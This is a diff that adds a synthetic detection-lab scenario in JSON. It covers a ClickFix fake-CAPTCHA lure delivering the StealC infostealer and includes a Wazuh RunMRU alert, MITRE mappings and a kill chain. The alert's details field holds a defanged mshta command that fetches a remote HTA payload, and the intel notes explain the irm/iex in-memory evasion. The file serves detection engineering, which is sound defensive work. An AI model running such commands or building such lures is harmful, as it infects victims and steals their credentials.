@@ -1,0 +1,50 @@
+{
+  "scenario": "clickfix_stealc",
+  "title": "ClickFix fake-CAPTCHA lure leading to StealC infostealer",
+  "source": {
+    "telemetry": "Windows Sysmon (Event ID 13, registry SetValue) via Wazuh agent",
+    "detection": "Wazuh rule 100700 -- ClickFix: RunMRU entry containing remote-execution command",
+    "provenance": "synthetic",
+    "provenance_note": "Constructed from published ClickFix campaign reporting. The telemetry field shapes mirror what the windows_eventchannel decoder emits on this lab's real agent (doubled backslashes normalised for display). No live malware was executed to produce this."
+  },
+  "intel": {
+    "campaign": "ClickFix / fake-CAPTCHA paste lure",
+    "summary": "A fake CAPTCHA or browser error page uses JavaScript to silently write a long PowerShell or mshta command to the victim's clipboard, then instructs them to press Win+R, Ctrl+V, Enter. The victim executes the attacker's command themselves, which sidesteps most download and macro controls entirely.",
+    "delivers": ["StealC", "Lumma Stealer", "Amatera"],
+    "observed_kill_chain": [
+      "Victim lands on compromised site or malvertised page showing a fake CAPTCHA",
+      "Page JavaScript writes the payload command to the clipboard",
+      "Victim pastes into the Run dialog (Win+R) and presses Enter",
+      "RunMRU registry key records what was typed -- key forensic artifact",
+      "forfiles -> mshta -> PowerShell -> curl.exe -> tar.exe",
+      "Persistence written via reg.exe",
+      "Infostealer beacons to attacker infrastructure"
+    ],
+    "evasion_note": "The command builds 'irm' (Invoke-RestMethod) via runtime string substitution and pipes the response to 'iex', so the retrieved payload executes in memory and never lands on disk under a recognisable download syntax."
+  },
+  "mitre": {
+    "id": ["T1204.004", "T1218.005", "T1059.001"],
+    "tactic": ["Execution", "Defense Evasion"],
+    "technique": [
+      "User Execution: Malicious Copy and Paste",
+      "System Binary Proxy Execution: Mshta",
+      "Command and Scripting Interpreter: PowerShell"
+    ]
+  },
+  "timestamp": "2026-08-20T18:22:41.118+0000",
+  "alert": {
+    "level": 13,
+    "description": "ClickFix: RunMRU entry contains remote-execution command (paste-to-run lure)",
+    "host": "WIN11-LAB01",
+    "user": "WIN11-LAB01\\analyst",
+    "fields": {
+      "eventType": "SetValue",
+      "image": "C:\\Windows\\explorer.exe",
+      "targetObject": "HKU\\S-1-5-21-1111111111-2222222222-3333333333-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\a",
+      "details": "mshta https://cdn-verify-cf[.]workers[.]dev/v/check.hta # \u2713 Verification ID: 8812-CF-4471\\1",
+      "processId": "4188",
+      "parentImage": "C:\\Windows\\explorer.exe"
+    }
+  },
+  "analyst_note": "The trailing 'Verification ID' text is padding the lure page appends so the Run dialog visually truncates the real command. RunMRU is the strongest artifact here because it survives the process exiting."
+}
